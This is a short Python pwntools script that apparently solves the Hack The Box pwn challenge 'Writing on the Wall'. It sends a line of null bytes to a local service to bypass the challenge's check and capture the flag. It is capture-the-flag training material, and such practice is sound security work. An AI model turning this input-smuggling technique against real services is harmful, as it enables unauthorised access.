# https://app.hackthebox.com/challenges/Writing%2520on%2520the%2520Wall
# Tags: pwn
from pwn import *

warnings.filterwarnings('ignore')
context.arch = 'amd64'

IP="127.0.0.1"
PORT=1337

target = connect(IP, PORT)
target.sendlineafter(">> ", b"\x00\x00\x00\x00\x00\x00\x00")
flag = re.search(r"HTB{.*?}", target.recvline_contains(b"HTB").strip().decode()).group()
print(f"[\u2714] Flag captured: \033[1;37m{flag}\033[0m")
